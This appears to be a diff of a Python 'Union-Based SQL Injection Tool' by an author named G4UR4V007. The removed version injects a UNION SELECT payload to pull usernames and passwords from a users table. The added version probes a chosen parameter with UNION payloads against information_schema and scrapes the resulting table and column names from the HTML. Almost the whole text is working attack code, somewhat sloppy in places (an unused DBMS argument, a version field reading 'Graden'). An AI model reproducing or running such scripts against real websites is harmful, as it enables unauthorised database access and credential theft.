@@ -1,48 +1,99 @@
-import requests
-import re
-import argparse
+# -*- coding: utf-8 -*-
 
-# Define the logo
-logo = r"""
-   _____                _             
-  / ____|             | |            
- | |  __  __ _ _ __ __| | ___ _ __   
- | | |_ |/ _` | '__/ _` |/ _ \ '_ \  
- | |__| | (_| | | | (_| |  __/ | | | 
-  \_____|\\__,_|_| \__,_|\___|_| |_| 
-                                      
-          Union-Based SQL Injection Tool
-          Version: 1.0
-          Author: G4UR4V007
+"""
+ Union-Based SQL Injection Tool
+ Version: Graden
+ Author: G4UR4V007
 """
 
-# Print the logo
-print(logo)
+import requests
+from bs4 import BeautifulSoup
+import argparse
 
-# Define the parser
-parser = argparse.ArgumentParser(description='Union-Based SQL Injection Tool')
-parser.add_argument('-u', '--url', help='Specify the URL', required=True)
-parser.add_argument('-c', '--columns', help='Specify the columns to extract (comma-separated)', default='username,password')
-args = parser.parse_args()
+# Define the banner
+BANNER = """
+   _____               _              
+  / ____|             | |             
+ | |  __  __ _ _ __ __| | ___ _ __ ___  
+ | | |_ |/ _` | '__/ _` |/ _ \ '__/ _ \ 
+ | |__| | (_| | | | (_| |  __/ | | (_) |
+  \_____|\\__,_|_|\\__,_|\\___|_|  \\___/ 
+"""
 
-# Define the injection point
-injection_point = "id"
+# Define the usage
+USAGE = """
+usage: union_sqli.py [-h] -u URL -p PARAM -d DBMS
 
-# Define the SQL injection payload
-payload = " UNION SELECT {} FROM users -- -".format(args.columns)
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     target URL
+  -p PARAM, --param PARAM  vulnerable parameter
+  -d DBMS, --dbms DBMS  database management system (e.g., MySQL, PostgreSQL)
+"""
 
-# Define the headers
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-}
+# Define the supported DBMS
+SUPPORTED_DBMS = ["MySQL", "PostgreSQL"]
 
-# Send the request with the injection payload
-response = requests.get(args.url.replace(injection_point, injection_point + payload), headers=headers)
+def get_args():
+    parser = argparse.ArgumentParser(description=BANNER, usage=USAGE)
+    parser.add_argument("-u", "--url", required=True, help="target URL")
+    parser.add_argument("-p", "--param", required=True, help="vulnerable parameter")
+    parser.add_argument("-d", "--dbms", required=True, help="database management system")
+    args = parser.parse_args()
+    return args
 
-# Extract the data from the response
-data = re.findall(r"<td>(.*?)</td>", response.text)
+def test_sqli(url, param, dbms):
+    # Send a request to the target URL with a malicious payload
+    payload = "' UNION SELECT * FROM information_schema.tables --"
+    params = {param: payload}
+    response = requests.get(url, params=params)
+    
+    # Check for SQL injection vulnerability in the response
+    if "information_schema.tables" in response.text:
+        print("[+] SQL injection vulnerability found!")
+        return True
+    else:
+        print("[-] No SQL injection vulnerability found.")
+        return False
 
-# Print the extracted data
-columns = args.columns.split(',')
-for i, column in enumerate(columns):
-    print("{}: {}".format(column, data[i]))
+def extract_data(url, param, dbms):
+    # Extract the database structure
+    print("[+] Extracting database information...")
+    payload = "' UNION SELECT table_name, column_name FROM information_schema.columns --"
+    params = {param: payload}
+    response = requests.get(url, params=params)
+    
+    # Parse the response to extract the database structure
+    tables = []
+    columns = []
+    soup = BeautifulSoup(response.text, 'html.parser')
+    for row in soup.find_all('tr'):
+        cols = row.find_all('td')
+        if len(cols) == 2:
+            tables.append(cols[0].text.strip())
+            columns.append(cols[1].text.strip())
+
+    # Print the extracted data
+    print("[+] Database structure:")
+    for table, column in zip(tables, columns):
+        print(f"  - {table}.{column}")
+
+def main():
+    args = get_args()
+    url = args.url
+    param = args.param
+    dbms = args.dbms
+
+    # Check if the DBMS is supported
+    if dbms not in SUPPORTED_DBMS:
+        print("[-] Unsupported DBMS. Please use one of the following: {}".format(", ".join(SUPPORTED_DBMS)))
+        return
+
+    # Test for SQL injection vulnerability
+    if test_sqli(url, param, dbms):
+        # Extract data from the database
+        extract_data(url, param, dbms)
+
+if __name__ == "__main__":
+    print(BANNER)
+    main()
